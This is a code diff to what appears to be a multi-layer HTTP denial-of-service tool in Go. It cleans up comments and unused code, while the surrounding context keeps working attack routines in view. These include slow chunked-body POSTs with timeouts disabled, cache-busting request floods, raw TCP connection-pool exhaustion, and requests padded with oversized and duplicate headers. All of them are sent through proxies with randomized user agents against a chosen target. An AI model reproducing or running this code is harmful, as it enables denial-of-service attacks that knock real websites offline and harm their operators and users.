@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"io"
 	"math/rand"
-	"net"
 	"net/http"
 	"strings"
 	"time"
@@ -16,7 +15,6 @@ import (
 // ============================================================
 func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClient()
-	// Disable timeout — we want connections to stay open
 	client.Timeout = 0
 
 	targetURL := o.target.String()
@@ -29,7 +27,6 @@ func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 		default:
 		}
 
-		// Build a request with chunked transfer encoding
 		body := slowChunkedBody()
 
 		req, err := http.NewRequestWithContext(ctx, "POST", targetURL, body)
@@ -68,7 +65,6 @@ func slowChunkedBody() io.Reader {
 	r, w := io.Pipe()
 	go func() {
 		defer w.Close()
-		// Send initial chunk
 		w.Write([]byte("data=" + strings.Repeat("A", 4096)))
 		for i := 0; i < 20; i++ {
 			time.Sleep(time.Duration(rand.Intn(200)+50) * time.Millisecond)
@@ -88,7 +84,7 @@ var (
 		"/wp-admin/admin-ajax.php", "/graphql",
 		"/api/v1/users", "/api/v1/posts",
 	}
-	recursiveParams = []string{"q", "search", "query", "keyword", "s", "filter", "term"}
+	recursiveParams  = []string{"q", "search", "query", "keyword", "s", "filter", "term"}
 	paginationParams = []string{"page", "offset", "p", "pg", "start"}
 )
 
@@ -152,13 +148,6 @@ var (
 		"/api/status", "/api/health", "/favicon.ico",
 		"/robots.txt", "/sitemap.xml",
 	}
-	cacheBustHeaders = map[string]string{
-		"Cache-Control":           "no-cache, no-store, must-revalidate",
-		"Pragma":                  "no-cache",
-		"X-Forwarded-For":         "",
-		"X-Real-IP":               "",
-		"Accept-Encoding":         "gzip, deflate",
-	}
 )
 
 func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
@@ -174,7 +163,6 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		}
 
 		path := cachePaths[rand.Intn(len(cachePaths))]
-		// Add unique cache-busting parameter
 		fullURL := fmt.Sprintf("%s%s?_=%d&nocache=%d",
 			baseURL, path, time.Now().UnixNano(), rand.Int63())
 
@@ -206,7 +194,6 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		// Very low delay — volume layer
 		time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
 	}
 }
@@ -224,7 +211,6 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 		default:
 		}
 
-		// Use raw TCP connection for maximum control
 		conn, err := o.proxyMgr.dialer.Dial("tcp", o.target.Host)
 		if err != nil {
 			o.stats.FailedRequests.Add(1)
@@ -238,7 +224,6 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		// Send a valid HTTP request to keep the connection alive
 		reqStr := fmt.Sprintf(
 			"GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
 			o.target.Host, randomUA(),
@@ -251,12 +236,10 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 			continue
 		}
 
-		// Read partial response to keep connection alive
 		buf := make([]byte, 4096)
 		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
 		conn.Read(buf)
 
-		// Periodically send more data on the same connection
 		for i := 0; i < 10; i++ {
 			select {
 			case <-ctx.Done():
@@ -312,23 +295,19 @@ func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) erro
 		req.Header.Set("User-Agent", randomUA())
 		req.Header.Set("Connection", "keep-alive")
 
-		// Add oversized headers (8KB+ each)
 		oversizedValue := randomString(8192 + rand.Intn(8192))
 		req.Header.Set("X-Oversized-Data", oversizedValue)
 
-		// Add multiple oversized custom headers
 		for _, name := range oversizedHeaderNames {
 			if rand.Intn(2) == 0 {
 				req.Header.Set(name, randomString(4096+rand.Intn(4096)))
 			}
 		}
 
-		// Add duplicate headers (some servers merge them, wasting CPU)
 		for i := 0; i < 50; i++ {
 			req.Header.Add("X-Duplicate-Test", "value-"+intToStr(i))
 		}
 
-		// Invalid encoding header
 		req.Header.Set("Accept-Encoding", "gzip;q=0, identity;q=0, *;q=0, br;q=0")
 
 		resp, err := client.Do(req)
@@ -382,6 +361,3 @@ func randomString(n int) string {
 	}
 	return string(b)
 }
-
-// Ensure net package is used (for layer4)
-var _ = net.Dial
